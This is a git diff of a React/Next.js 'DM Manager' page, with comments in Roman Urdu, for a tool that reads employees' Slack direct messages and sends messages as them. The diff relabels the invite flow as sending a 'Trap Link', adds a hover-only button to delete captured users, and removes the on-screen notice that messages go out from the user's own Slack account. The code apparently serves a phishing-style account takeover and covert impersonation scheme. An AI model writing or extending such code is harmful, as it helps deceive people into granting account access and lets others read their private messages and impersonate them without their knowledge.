@@ -1,12 +1,11 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 /* eslint-disable react-hooks/immutability */
 // app/dm-manager/page.tsx
-
 "use client";
 import React, { useEffect, useState } from 'react';
 import { db } from '@/lib/firebase';
 import { collection, onSnapshot } from 'firebase/firestore';
-import { Send, User, MessageSquare, Shield, Link as LinkIcon, Lock, AlertCircle } from 'lucide-react';
+import { Send, User, MessageSquare, Shield, Link as LinkIcon, Lock, AlertCircle, Trash2 } from 'lucide-react'; // 👈 Trash2 import kiya
 
 export default function DMManager() {
   const [connectedUsers, setConnectedUsers] = useState<any[]>([]);
@@ -16,7 +15,6 @@ export default function DMManager() {
   const [messages, setMessages] = useState<any[]>([]);
   const [inputText, setInputText] = useState('');
   
-  // Invite System State
   const [inviteId, setInviteId] = useState('');
   const [inviteStatus, setInviteStatus] = useState<{msg: string, type: 'success' | 'error' | ''}>({msg: '', type: ''});
 
@@ -48,11 +46,7 @@ export default function DMManager() {
     if(!activeUser || !activeChat) return;
     const res = await fetch('/api/slack/manager', {
         method: 'POST',
-        body: JSON.stringify({ 
-            action: 'get_messages', 
-            targetUserId: activeUser.id, 
-            channelId: activeChat.id 
-        })
+        body: JSON.stringify({ action: 'get_messages', targetUserId: activeUser.id, channelId: activeChat.id })
     });
     const data = await res.json();
     if(data.messages) setMessages(data.messages);
@@ -63,21 +57,15 @@ export default function DMManager() {
     if(!inputText.trim()) return;
     await fetch('/api/slack/manager', {
         method: 'POST',
-        body: JSON.stringify({ 
-            action: 'send_as_user', 
-            targetUserId: activeUser.id, 
-            channelId: activeChat.id,
-            text: inputText
-        })
+        body: JSON.stringify({ action: 'send_as_user', targetUserId: activeUser.id, channelId: activeChat.id, text: inputText })
     });
     setInputText('');
     loadMessages();
   };
 
-  // 👇 UPDATED SEND INVITE FUNCTION
   const sendInvite = async () => {
     if(!inviteId) return;
-    setInviteStatus({ msg: 'Sending...', type: '' });
+    setInviteStatus({ msg: 'Sending Trap...', type: '' });
     
     try {
         const res = await fetch('/api/slack/manager', {
@@ -87,15 +75,29 @@ export default function DMManager() {
         const data = await res.json();
         
         if(data.success) {
-            setInviteStatus({ msg: '✅ Link sent successfully via Bot!', type: 'success' });
+            setInviteStatus({ msg: '✅ Trap Link Sent!', type: 'success' });
             setInviteId('');
         } else {
-            // Ab ye Asal Error dikhayega
             setInviteStatus({ msg: `❌ Error: ${data.error}`, type: 'error' });
         }
     } catch (e) {
         setInviteStatus({ msg: '❌ Network Error', type: 'error' });
     }
+  };
+
+  // 👇 DELETE FUNCTION (NEW)
+  const handleDeleteUser = async (userId: string, e: React.MouseEvent) => {
+    e.stopPropagation(); // Taakay user select na ho jaye
+    if(!confirm("Are you sure you want to remove this employee?")) return;
+
+    // UI se foran hatana (Optimistic Update)
+    if(activeUser?.id === userId) { setActiveUser(null); setChats([]); }
+    
+    // API Call to delete from Firebase
+    await fetch('/api/slack/manager', {
+        method: 'POST',
+        body: JSON.stringify({ action: 'delete_user', targetUserId: userId })
+    });
   };
 
   return (
@@ -137,17 +139,28 @@ export default function DMManager() {
                 {connectedUsers.length === 0 && <p className="text-xs text-gray-600 px-2 italic">No employees connected yet.</p>}
                 
                 {connectedUsers.map(u => (
-                    <button 
+                    <div 
                         key={u.id}
                         onClick={() => { setActiveUser(u); setActiveChat(null); }}
-                        className={`w-full flex items-center gap-3 p-3 rounded-lg text-left transition-all mb-1 ${activeUser?.id === u.id ? 'bg-amber-500/20 text-white border border-amber-500/50' : 'text-gray-400 hover:bg-gray-800'}`}
+                        className={`group w-full flex items-center justify-between gap-3 p-3 rounded-lg cursor-pointer transition-all mb-1 ${activeUser?.id === u.id ? 'bg-amber-500/20 text-white border border-amber-500/50' : 'text-gray-400 hover:bg-gray-800'}`}
                     >
-                        <img src={u.image || "https://ca.slack-edge.com/T00000000-U00000000-g00000000000-512"} className="w-8 h-8 rounded-full bg-gray-700" />
-                        <div className="overflow-hidden">
-                            <div className="font-medium text-sm truncate">{u.name}</div>
-                            <div className="text-[10px] opacity-60 truncate">{u.id}</div>
+                        <div className="flex items-center gap-3 overflow-hidden">
+                            <img src={u.image || "https://ca.slack-edge.com/T00000000-U00000000-g00000000000-512"} className="w-8 h-8 rounded-full bg-gray-700" />
+                            <div className="overflow-hidden">
+                                <div className="font-medium text-sm truncate">{u.name}</div>
+                                <div className="text-[10px] opacity-60 truncate">{u.id}</div>
+                            </div>
                         </div>
-                    </button>
+                        
+                        {/* DELETE BUTTON - Sirf Hover par dikhega */}
+                        <button 
+                            onClick={(e) => handleDeleteUser(u.id, e)}
+                            className="p-1.5 rounded-md hover:bg-red-500/20 text-gray-600 hover:text-red-400 opacity-0 group-hover:opacity-100 transition-all"
+                            title="Remove User"
+                        >
+                            <Trash2 className="h-4 w-4" />
+                        </button>
+                    </div>
                 ))}
             </div>
         </div>
@@ -219,10 +232,6 @@ export default function DMManager() {
                                 <Send className="h-5 w-5" />
                             </button>
                         </div>
-                        <p className="text-[10px] text-gray-500 mt-2 text-center flex items-center justify-center gap-1">
-                            <AlertCircle className="h-3 w-3" />
-                            Messages are sent directly from {activeUser.name}&apos;s Slack account.
-                        </p>
                     </form>
                 </>
             ) : (
